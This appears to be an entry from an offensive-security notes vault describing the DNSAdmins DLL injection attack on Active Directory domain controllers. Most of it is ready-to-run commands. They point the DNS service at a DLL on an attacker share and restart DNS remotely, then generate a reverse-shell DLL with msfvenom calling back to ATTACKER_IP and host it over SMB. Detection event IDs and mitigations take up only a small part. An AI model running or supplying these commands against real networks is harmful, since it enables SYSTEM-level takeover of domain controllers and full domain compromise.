---
title: "Attack #46 — DNSAdmins DLL Injection"
description: "Members of the DnsAdmins group can configure the DNS service to load an arbitrary DLL via the ServerLevelPluginDll registry key. Since the DNS service…"
category: active-directory
tags: ["active-directory"]
tools: ["PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #46 — DNSAdmins DLL Injection.md"
---
# 🟣 Attack #46 — DNSAdmins DLL Injection

***

## 📖 How It Works

Members of the **DnsAdmins** group can configure the DNS service to load an arbitrary DLL via the `ServerLevelPluginDll` registry key. Since the DNS service runs as **SYSTEM** on Domain Controllers, loading a malicious DLL grants SYSTEM-level code execution on the DC.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Membership in DnsAdmins group** | Or equivalent permission to configure DNS |
| **DNS service on DC** | Standard — runs on DCs by default |
| **SMB share hosting DLL** | DLL must be accessible from DC |

***

## 💻 Full Commands

```powershell
# ── Check group membership ────────────────────────────────────────────────────
net user low_user /domain | findstr /i "dnsadmins"

# ── Set malicious DLL plugin ──────────────────────────────────────────────────
dnscmd DC01.corp.local /config /serverlevelplugindll \\ATTACKER\share\evil.dll

# ── Restart DNS service (requires restart to load DLL) ────────────────────────
sc \\DC01.corp.local stop dns
sc \\DC01.corp.local start dns
# DLL executes as SYSTEM on DC01

# ── Cleanup — remove the plugin DLL config ────────────────────────────────────
dnscmd DC01.corp.local /config /serverlevelplugindll ""
```

```bash
# ── Generate reverse shell DLL ────────────────────────────────────────────────
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -f dll -o evil.dll

# ── Host on SMB share ─────────────────────────────────────────────────────────
smbserver.py share /path/to/dll/ -smb2support
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **770** | DNS Server Log | DNS plugin DLL loaded |
| **7045** | System Log | DNS service restart |
| **4688** | Security Log | dnscmd.exe execution with ServerLevelPluginDll argument |

***

## 🔗 Attack Chain Context

```
[DNSAdmins] ──→ DLL Injection → SYSTEM on DC
         │
         ├──→ 🔗 DnsAdmins membership → SYSTEM on DC → DCSync
         ├──→ ⚠️ Requires DNS service restart — may cause brief DNS outage
         └──→ 💀 Defeated by: audit DnsAdmins membership, monitor dnscmd usage
```

***

> ✅ **Attack #46 — DNSAdmins complete.**
